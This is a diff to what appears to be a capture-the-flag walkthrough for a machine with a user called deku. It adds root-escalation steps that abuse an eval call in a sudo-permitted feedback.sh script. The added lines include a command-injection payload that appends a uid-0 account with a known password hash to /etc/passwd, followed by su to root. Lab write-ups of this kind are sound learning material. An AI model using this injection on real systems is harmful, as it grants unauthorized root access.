@@ -29,8 +29,21 @@
 29. we get password for deku
 30. we find user flag
 31. sudo -l ->  /opt/NewComponent/feedback.sh
-32. 
-
-33. 
+32. mkpasswd -m md5crypt -s
+33. Password: 123
+34. $1$tbnb4vuW$eI8Md2cXWjeQIUMFAmSvg1  
+35. test:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:test:/root:/bin/bash
+36. 'test:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:test:/root:/bin/bash' >> /etc/passwd
+37. su test
+38. We get access as root
+39. We get root flag
+40. ## root flag exploit
+41. In the feedback.sh code there is a line "eval "echo $feedback""
+42. it exceutes eval $feedback
+43. if we enter abc >> file.txt, it echoes, abc to file.txt
+44. so, we create a password on our system and make it in the format user is store in /etc/passwd file
+45. Then we echo the same to /etc/passwd
+46. as eval() is a system function, it get executed
+47. 
   
 
